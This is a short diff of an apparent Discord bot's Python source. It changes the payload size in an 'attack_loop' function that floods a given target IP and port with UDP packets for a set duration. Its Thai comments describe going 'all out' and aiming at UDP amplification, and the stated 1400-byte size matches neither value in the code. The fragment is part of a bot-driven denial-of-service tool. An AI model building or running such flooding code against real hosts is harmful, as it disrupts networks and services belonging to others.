@@ -26,7 +26,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 # ฟังก์ชันยิง UDP (จัดหนักจัดเต็ม)
 # ---------------------------------------------------------
 async def attack_loop(ctx, target_ip, target_port, duration_sec):
-    packet_data = b"gr_" + (b"X" * 9999999) # สร้างขยะ 1400 ไบต์ เพื่อเน้น Udp Amplification
+    packet_data = b"gr_" + (b"X" * 99999) # สร้างขยะ 1400 ไบต์ เพื่อเน้น Udp Amplification
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     start_time = time.time()
